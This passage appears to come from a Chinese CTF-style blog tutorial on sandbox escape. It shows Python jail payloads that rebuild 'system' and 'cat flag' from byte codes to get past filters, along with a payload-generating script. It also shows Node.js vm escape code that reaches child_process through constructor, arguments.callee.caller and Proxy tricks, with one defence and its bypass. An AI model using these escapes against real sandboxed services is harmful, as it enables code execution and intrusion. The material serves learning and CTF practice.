+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1>#使用bytes([]).decode()来绕过chr的decode</span>
+</span></span><span class=line><span class=cl><span class=nb>open</span><span class=p>((</span><span class=nb>bytes</span><span class=p>([</span><span class=mi>102</span><span class=p>])</span><span class=o>+</span><span class=nb>bytes</span><span class=p>([</span><span class=mi>108</span><span class=p>])</span><span class=o>+</span><span class=nb>bytes</span><span class=p>([</span><span class=mi>97</span><span class=p>])</span><span class=o>+</span><span class=nb>bytes</span><span class=p>([</span><span class=mi>103</span><span class=p>]))</span><span class=o>.</span><span class=n>decode</span><span class=p>())</span><span class=o>.</span><span class=n>read</span><span class=p>()</span></span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1>#获取object的子类列表中倒数第四个子类的__init__方法的全局变量中名为&#39;system&#39;的对象</span>
+</span></span><span class=line><span class=cl><span class=p>[]</span><span class=o>.</span><span class=vm>__class__</span><span class=o>.</span><span class=vm>__mro__</span><span class=p>[</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span><span class=o>.</span><span class=n>__subclasses__</span><span class=p>()[</span><span class=o>-</span><span class=mi>4</span><span class=p>]</span><span class=o>.</span><span class=fm>__init__</span><span class=o>.</span><span class=vm>__globals__</span><span class=p>[(</span><span class=nb>bytes</span><span class=p>([</span><span class=mi>115</span><span class=p>])</span><span class=o>+</span><span class=nb>bytes</span><span class=p>([</span><span class=mi>121</span><span class=p>])</span><span class=o>+</span><span class=nb>bytes</span><span class=p>([</span><span class=mi>115</span><span class=p>])</span><span class=o>+</span><span class=nb>bytes</span><span class=p>([</span><span class=mi>116</span><span class=p>])</span><span class=o>+</span><span class=nb>bytes</span><span class=p>([</span><span class=mi>101</span><span class=p>])</span><span class=o>+</span><span class=nb>bytes</span><span class=p>([</span><span class=mi>109</span><span class=p>]))</span><span class=o>.</span><span class=n>decode</span><span class=p>()]((</span><span class=nb>bytes</span><span class=p>([</span><span class=mi>99</span><span class=p>])</span><span class=o>+</span><span class=nb>bytes</span><span class=p>([</span><span class=mi>97</span><span class=p>])</span><span class=o>+</span><span class=nb>bytes</span><span class=p>([</span><span class=mi>116</span><span class=p>])</span><span class=o>+</span><span class=nb>bytes</span><span class=p>([</span><span class=mi>32</span><span class=p>])</span><span class=o>+</span><span class=nb>bytes</span><span class=p>([</span><span class=mi>102</span><span class=p>])</span><span class=o>+</span><span class=nb>bytes</span><span class=p>([</span><span class=mi>108</span><span class=p>])</span><span class=o>+</span><span class=nb>bytes</span><span class=p>([</span><span class=mi>97</span><span class=p>])</span><span class=o>+</span><span class=nb>bytes</span><span class=p>([</span><span class=mi>103</span><span class=p>]))</span><span class=o>.</span><span class=n>decode</span><span class=p>())</span></span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1>#如果过滤了bytes，可以用type(str(1).encode())绕过</span>
+</span></span><span class=line><span class=cl><span class=p>[]</span><span class=o>.</span><span class=vm>__class__</span><span class=o>.</span><span class=vm>__mro__</span><span class=p>[</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span><span class=o>.</span><span class=n>__subclasses__</span><span class=p>()[</span><span class=o>-</span><span class=mi>4</span><span class=p>]</span><span class=o>.</span><span class=fm>__init__</span><span class=o>.</span><span class=vm>__globals__</span><span class=p>[(</span><span class=nb>type</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>())([</span><span class=mi>115</span><span class=p>])</span><span class=o>+</span><span class=nb>type</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>())([</span><span class=mi>121</span><span class=p>])</span><span class=o>+</span><span class=nb>type</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>())([</span><span class=mi>115</span><span class=p>])</span><span class=o>+</span><span class=nb>type</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>())([</span><span class=mi>116</span><span class=p>])</span><span class=o>+</span><span class=nb>type</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>())([</span><span class=mi>101</span><span class=p>])</span><span class=o>+</span><span class=nb>type</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>())([</span><span class=mi>109</span><span class=p>]))</span><span class=o>.</span><span class=n>decode</span><span class=p>()]((</span><span class=nb>type</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>())([</span><span class=mi>108</span><span class=p>])</span><span class=o>+</span><span class=nb>type</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>())([</span><span class=mi>115</span><span class=p>]))</span><span class=o>.</span><span class=n>decode</span><span class=p>())</span>
+</span></span><span class=line><span class=cl><span class=c1>#system(&#39;ls&#39;)</span></span></span></code></pre></td></tr></table></div></div><p>一些方法的type构造</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>str = type(str(0))
+</span></span><span class=line><span class=cl>list = type(type(flag).mro())(flag)
+</span></span><span class=line><span class=cl>bytes = type(flag.encode())
+</span></span><span class=line><span class=cl>bool = type(flag.istitle())
+</span></span><span class=line><span class=cl>int = type(flag.find(flag))
+</span></span><span class=line><span class=cl>tuple = type(flag.partition(flag))</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1>#如果+被过滤，可以使用.__add__(xxx)来绕过</span>
+</span></span><span class=line><span class=cl><span class=c1>#自动生成Payload的脚本:</span>
+</span></span><span class=line><span class=cl><span class=n>command</span> <span class=o>=</span> <span class=s2>&#34;cat flag_y0u_CaNt_FiNd_mE&#34;</span>
+</span></span><span class=line><span class=cl><span class=n>mylist</span> <span class=o>=</span> <span class=p>[]</span>
+</span></span><span class=line><span class=cl><span class=n>system</span> <span class=o>=</span> <span class=s2>&#34;[].__class__.__mro__[-1].__subclasses__()[-4].__init__.__globals__[(type(str(1).encode())([115]).__add__(type(str(1).encode())([121])).__add__(type(str(1).encode())([115])).__add__(type(str(1).encode())([116])).__add__(type(str(1).encode())([101])).__add__(type(str(1).encode())([109]))).decode()]&#34;</span>
+</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>system</span><span class=p>,</span><span class=n>end</span><span class=o>=</span><span class=s1>&#39;&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=n>command</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=n>mylist</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;type(str(1).encode())([</span><span class=si>{</span><span class=nb>ord</span><span class=p>(</span><span class=n>i</span><span class=p>)</span><span class=si>}</span><span class=s2>])&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s2>&#34;(&#34;</span><span class=o>+</span><span class=n>mylist</span><span class=o>.</span><span class=n>pop</span><span class=p>(</span><span class=mi>0</span><span class=p>),</span><span class=n>end</span><span class=o>=</span><span class=s1>&#39;&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=c1># 删除并打印出列表的第一个元素</span>
+</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>item</span> <span class=ow>in</span> <span class=n>mylist</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;.__add__(</span><span class=si>{</span><span class=n>item</span><span class=si>}</span><span class=s2>)&#34;</span><span class=p>,</span><span class=n>end</span><span class=o>=</span><span class=s1>&#39;&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s2>&#34;)&#34;</span><span class=p>,</span><span class=n>end</span><span class=o>=</span><span class=s1>&#39;&#39;</span><span class=p>)</span></span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1>#type被过滤了可以使用list(dict(system=114514))[0]获取system这个字符串</span>
+</span></span><span class=line><span class=cl><span class=p>[]</span><span class=o>.</span><span class=vm>__class__</span><span class=o>.</span><span class=vm>__mro__</span><span class=p>[</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span><span class=o>.</span><span class=n>__subclasses__</span><span class=p>()[</span><span class=o>-</span><span class=mi>4</span><span class=p>]</span><span class=o>.</span><span class=fm>__init__</span><span class=o>.</span><span class=vm>__globals__</span><span class=p>[</span><span class=nb>list</span><span class=p>(</span><span class=nb>dict</span><span class=p>(</span><span class=n>system</span><span class=o>=</span><span class=mi>1</span><span class=p>))[</span><span class=mi>0</span><span class=p>]](</span><span class=nb>list</span><span class=p>(</span><span class=nb>dict</span><span class=p>(</span><span class=n>sh</span><span class=o>=</span><span class=mi>1</span><span class=p>))[</span><span class=mi>0</span><span class=p>])</span></span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1>#可以使用dir()函数查看类中的方法和变量名</span>
+</span></span><span class=line><span class=cl><span class=c1>#如果有encode方法就可以读取flag</span>
+</span></span><span class=line><span class=cl><span class=o>&gt;</span> <span class=n>my_flag</span><span class=o>.</span><span class=n>flag_level5</span><span class=o>.</span><span class=n>encode</span><span class=p>()</span></span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1>#可以输入globals()函数查看全局变量中是否有信息泄露</span>
+</span></span><span class=line><span class=cl><span class=c1>#可以输入vars()函数查看全局变量中是否有信息泄露</span></span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1>#利用__import__()函数动态导入模块</span>
+</span></span><span class=line><span class=cl><span class=nb>__import__</span><span class=p>(</span><span class=s2>&#34;sys&#34;</span><span class=p>)</span><span class=o>.</span><span class=n>__stdout__</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=nb>__import__</span><span class=p>(</span><span class=s2>&#34;os&#34;</span><span class=p>)</span><span class=o>.</span><span class=n>read</span><span class=p>(</span><span class=nb>__import__</span><span class=p>(</span><span class=s2>&#34;os&#34;</span><span class=p>)</span><span class=o>.</span><span class=n>open</span><span class=p>(</span><span class=s2>&#34;flag&#34;</span><span class=p>,</span><span class=nb>__import__</span><span class=p>(</span><span class=s2>&#34;os&#34;</span><span class=p>)</span><span class=o>.</span><span class=n>O_RDONLY</span><span class=p>),</span> <span class=mh>0x114</span><span class=p>)</span><span class=o>.</span><span class=n>decode</span><span class=p>())</span>
+</span></span><span class=line><span class=cl><span class=c1>#__import__(&#34;sys&#34;).__stdout__.write()从sys模块中获取stdout并调用write方法讲内容输出到控制台</span>
+</span></span><span class=line><span class=cl><span class=c1>#__import__(&#34;os&#34;).read()从os模块中调用read方法去读取文件内容，读取文件的前0x114(276)个字节</span>
+</span></span><span class=line><span class=cl><span class=c1>#__import__(&#34;os&#34;).open()从os模块中调用open方法打开一个名为flag 的文件，并设置为只读模式</span></span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1>#利用lambda匿名函数来读取flag</span>
+</span></span><span class=line><span class=cl><span class=p>(</span><span class=k>lambda</span><span class=p>:</span><span class=n>os</span><span class=o>.</span><span class=n>system</span><span class=p>(</span><span class=s1>&#39;cat flag&#39;</span><span class=p>))()</span></span></span></code></pre></td></tr></table></div></div><h2 class=heading-element id=vm沙箱逃逸><span>VM沙箱逃逸</span>
+<a href=#vm%e6%b2%99%e7%ae%b1%e9%80%83%e9%80%b8 class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h2><h3 class=heading-element id=vm沙箱逃逸-1><span>VM沙箱逃逸</span>
+<a href=#vm%e6%b2%99%e7%ae%b1%e9%80%83%e9%80%b8-1 class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><p>示例代码</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=c1>// 引入Nodejs标准库中的vm模块
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=kr>const</span> <span class=nx>vm</span> <span class=o>=</span> <span class=nx>require</span><span class=p>(</span><span class=s1>&#39;vm&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nx>sandbox</span> <span class=o>=</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=s1>&#39;name&#39;</span><span class=o>:</span> <span class=s1>&#39;someone&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s1>&#39;age&#39;</span><span class=o>:</span> <span class=mi>18</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=c1>// 创建一个沙箱对象，在这个上下文中执行的代码只能访问sandbox中的属性
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nx>context</span> <span class=o>=</span> <span class=nx>vm</span><span class=p>.</span><span class=nx>createContext</span><span class=p>(</span><span class=nx>sandbox</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=c1>// vm.runInThisContext(code)：在当前global下创建一个作用域（sandbox），并将接收到的参数当作代码运行。可以访问到global上的全局变量，但是访问不到自定义的变量
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=kr>const</span> <span class=nx>result</span> <span class=o>=</span> <span class=nx>vm</span><span class=p>.</span><span class=nx>runInThisContext</span><span class=p>(</span><span class=s2>&#34;process.mainModule.require(&#39;child_process&#39;).exec(&#39;calc&#39;)&#34;</span><span class=p>,</span> <span class=nx>context</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=nx>result</span><span class=p>)</span></span></span></code></pre></td></tr></table></div></div><p>执行命令需要child_process模块，但是在沙箱环境中不能直接require引入child_process</p><p>但是我们可以通过process对象获取</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=kr>const</span> <span class=nx>vm</span> <span class=o>=</span> <span class=nx>require</span><span class=p>(</span><span class=s1>&#39;vm&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=c1>//这里的this指向vm创建的context,然后通过原型链的方式拿到Function
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=kr>const</span> <span class=nx>y1</span> <span class=o>=</span> <span class=nx>vm</span><span class=p>.</span><span class=nx>runInNewContext</span><span class=p>(</span><span class=sb>`this.toString.constructor(&#34;return process&#34;)();`</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=c1>//只要是外部的引用的特性，都可以用来获取并进行逃逸
+</span></span></span><span class=line><span class=cl><span class=c1>//context = vm.createContext({a:[]})
+</span></span></span><span class=line><span class=cl><span class=c1>//const result = vm.runInNewContext(`a.constructor.constructor(&#34;return process&#34;)()`,context);
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=nx>y1</span><span class=p>.</span><span class=nx>mainModule</span><span class=p>.</span><span class=nx>require</span><span class=p>(</span><span class=s1>&#39;child_process&#39;</span><span class=p>).</span><span class=nx>exec</span><span class=p>(</span><span class=s1>&#39;calc&#39;</span><span class=p>));</span></span></span></code></pre></td></tr></table></div></div><p>对以上代码的防护手段(将上下文对象的原型链设置为null)</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=kr>const</span> <span class=nx>vm</span> <span class=o>=</span> <span class=nx>require</span><span class=p>(</span><span class=s1>&#39;vm&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nx>context</span> <span class=o>=</span> <span class=nb>Object</span><span class=p>.</span><span class=nx>create</span><span class=p>(</span><span class=kc>null</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>result</span> <span class=o>=</span> <span class=nx>vm</span><span class=p>.</span><span class=nx>runInNewContext</span><span class=p>(</span><span class=sb>`this.constructor.constructor(&#34;return process&#34;)()`</span><span class=p>,</span> <span class=nx>context</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=c1>//原型对象设置为null，所以this就无法通过二次constructor获取Function的原型对象
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nx>result</span><span class=p>.</span><span class=nx>mainModule</span><span class=p>.</span><span class=nx>require</span><span class=p>(</span><span class=s1>&#39;child_process&#39;</span><span class=p>).</span><span class=nx>exec</span><span class=p>(</span><span class=s1>&#39;calc&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=nx>result</span><span class=p>)</span></span></span></code></pre></td></tr></table></div></div><p>针对上述防护的绕过方法</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=c1>// 前置知识
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nx>arguments是一个object对象</span><span class=err>，</span><span class=nx>储存了每个调用函数中的相关参数</span>
+</span></span><span class=line><span class=cl><span class=nx>arguments</span><span class=p>.</span><span class=nx>callee是arguments的一个成员</span><span class=err>，</span><span class=nx>它的值是正在被执行的Function对象</span>
+</span></span><span class=line><span class=cl><span class=nx>arguments</span><span class=p>.</span><span class=nx>callee</span><span class=p>.</span><span class=nx>caller调用当前函数的外层函数</span><span class=err>，</span><span class=nx>如果是单函数无嵌套的话就是null</span></span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=c1>//绕过代码1——使用arguments.callee.caller实现绕过
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=kr>const</span> <span class=nx>vm</span> <span class=o>=</span> <span class=nx>require</span><span class=p>(</span><span class=s1>&#39;vm&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>res</span> <span class=o>=</span> <span class=nx>vm</span><span class=p>.</span><span class=nx>runInContext</span><span class=p>(</span><span class=sb>`
+</span></span></span><span class=line><span class=cl><span class=sb>    function test(){
+</span></span></span><span class=line><span class=cl><span class=sb>        const a = {}
+</span></span></span><span class=line><span class=cl><span class=sb>        a.toString = function () {
+</span></span></span><span class=line><span class=cl><span class=sb>            //获取调用当前函数的函数
+</span></span></span><span class=line><span class=cl><span class=sb>            const cc = arguments.callee.caller;
+</span></span></span><span class=line><span class=cl><span class=sb>            //利用函数的constructor来访问Function构造函数
+</span></span></span><span class=line><span class=cl><span class=sb>            //再次利用constructor来绕过沙箱限制获取process对象
+</span></span></span><span class=line><span class=cl><span class=sb>            const p = (cc.constructor.constructor(&#39;return process&#39;))();
+</span></span></span><span class=line><span class=cl><span class=sb>            return p.mainModule.require(&#39;child_process&#39;).execSync(&#39;calc&#39;).toString()
+</span></span></span><span class=line><span class=cl><span class=sb>        }
+</span></span></span><span class=line><span class=cl><span class=sb>        return a
+</span></span></span><span class=line><span class=cl><span class=sb>    }
+</span></span></span><span class=line><span class=cl><span class=sb>	test();`</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=nx>vm</span><span class=p>.</span><span class=nx>createContext</span><span class=p>(</span><span class=nb>Object</span><span class=p>.</span><span class=nx>create</span><span class=p>(</span><span class=kc>null</span><span class=p>)));</span>
+</span></span><span class=line><span class=cl><span class=c1>// 强制将res转换为字符串，因此触发了tostring方法即我们上面自定义的tostring方法
+</span></span></span><span class=line><span class=cl><span class=c1>// 从而绕过沙箱的限制实现了RCE
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=s2>&#34;&#34;</span> <span class=o>+</span> <span class=nx>res</span><span class=p>)</span></span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=c1>//绕过代码2——使用VM沙箱Proxy代理绕过
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=kr>const</span> <span class=nx>vm</span> <span class=o>=</span> <span class=nx>require</span><span class=p>(</span><span class=s1>&#39;vm&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=c1>//value是{}对象传入的，而{}对象在外部作用域下
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=kr>const</span> <span class=nx>code3</span> <span class=o>=</span> <span class=sb>`new Proxy({}, {
+</span></span></span><span class=line><span class=cl><span class=sb>    set: function(me, key, value) {
+</span></span></span><span class=line><span class=cl><span class=sb>        (value.constructor.constructor(&#39;return process&#39;))().mainModule.require(&#39;child_process&#39;).execSync(&#39;calc&#39;).toString()
+</span></span></span><span class=line><span class=cl><span class=sb>    }
+</span></span></span><span class=line><span class=cl><span class=sb>})`</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=c1>//在特定的上下文中运行code3
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nx>data</span> <span class=o>=</span> <span class=nx>vm</span><span class=p>.</span><span class=nx>runInContext</span><span class=p>(</span><span class=nx>code3</span><span class=p>,</span> <span class=nx>vm</span><span class=p>.</span><span class=nx>createContext</span><span class=p>(</span><span class=nb>Object</span><span class=p>.</span><span class=nx>create</span><span class=p>(</span><span class=kc>null</span><span class=p>)));</span>
+</span></span><span class=line><span class=cl><span class=c1>//设置data对象的一个属性时，就会触发我们之前定义的Proxy对象的&#34;set&#34;拦截器
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nx>data</span><span class=p>[</span><span class=s1>&#39;some_key&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=p>{};</span></span></span></code></pre></td></tr></table></div></div><h3 class=heading-element id=vm2沙箱逃逸><span>VM2沙箱逃逸</span>
+<a href=#vm2%e6%b2%99%e7%ae%b1%e9%80%83%e9%80%b8 class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><blockquote><p>vm2基于vm开发，使用官方的vm库构建沙箱环境。然后使用JavaScript的Proxy技术来防止沙箱脚本逃逸</p></blockquote><p>VM2代码包中主要用到的四个文件</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
